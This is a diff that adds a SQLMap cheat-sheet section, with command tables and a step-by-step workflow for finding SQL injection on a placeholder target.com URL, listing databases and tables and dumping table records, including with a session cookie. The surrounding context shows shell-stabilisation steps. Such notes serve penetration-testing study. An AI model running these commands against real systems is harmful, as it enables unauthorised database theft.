@@ -1204,3 +1204,62 @@ stty raw -echo; fg
 # Step 4 - Set terminal type
 export TERM=xterm
 ```
+## SQLMap
+
+### About SQLMap
+- **SQLMap** — An automated tool for detecting and exploiting SQL
+injection vulnerabilities in web applications
+- Pre-installed on Kali Linux
+- Can be used manually with flags or guided with --wizard mode
+
+### SQLMap Basic Syntax
+sqlmap -u "http://target.com/page?id=1" [options]
+### SQLMap Common Commands
+| Command | Description |
+|---------|-------------|
+| `sqlmap --help` | List all available flags |
+| `sqlmap --wizard` | Guided mode, perfect for beginners |
+| `sqlmap -u "URL"` | Test a URL for SQL injection |
+| `sqlmap -u "URL" --dbs` | Extract all available database names |
+| `sqlmap -u "URL" -D db_name --tables` | List all tables in a database |
+| `sqlmap -u "URL" -D db_name -T table_name --dump` | Dump all records from a table |
+| `sqlmap -u "URL" --cookie="cookie_value"` | Test with a session cookie |
+| `sqlmap -u "URL" --forms` | Automatically detect and test forms |
+| `sqlmap -u "URL" --batch` | Run without asking for user input |
+| `sqlmap -u "URL" --level=5` | Set testing level (1-5, higher = more thorough) |
+| `sqlmap -u "URL" --risk=3` | Set risk level (1-3, higher = more aggressive) |
+
+### SQLMap Workflow — Step by Step
+```bash
+# Step 1 — Test URL for SQL injection
+sqlmap -u "http://target.com/page?id=1"
+
+# Step 2 — Extract all database names
+sqlmap -u "http://target.com/page?id=1" --dbs
+
+# Step 3 — List tables in a specific database
+sqlmap -u "http://target.com/page?id=1" -D database_name --tables
+
+# Step 4 — Dump records from a specific table
+sqlmap -u "http://target.com/page?id=1" -D database_name -T table_name --dump
+
+# Step 5 — Use with session cookie (for authenticated pages)
+sqlmap -u "http://target.com/page?id=1" --cookie="PHPSESSID=abc123"
+```
+
+### SQLMap Key Flags Reference
+| Flag | Description |
+|------|-------------|
+| `-u` | Target URL to test |
+| `--dbs` | Extract all database names |
+| `-D` | Specify a database name |
+| `--tables` | List tables in specified database |
+| `-T` | Specify a table name |
+| `--dump` | Dump records from specified table |
+| `--cookie` | Pass a cookie for authenticated requests |
+| `--forms` | Detect and test HTML forms automatically |
+| `--batch` | Run in non-interactive mode |
+| `--wizard` | Guided step-by-step mode for beginners |
+| `--level` | Testing thoroughness level (1-5) |
+| `--risk` | Testing aggressiveness level (1-3) |
+| `--help` | List all available flags |
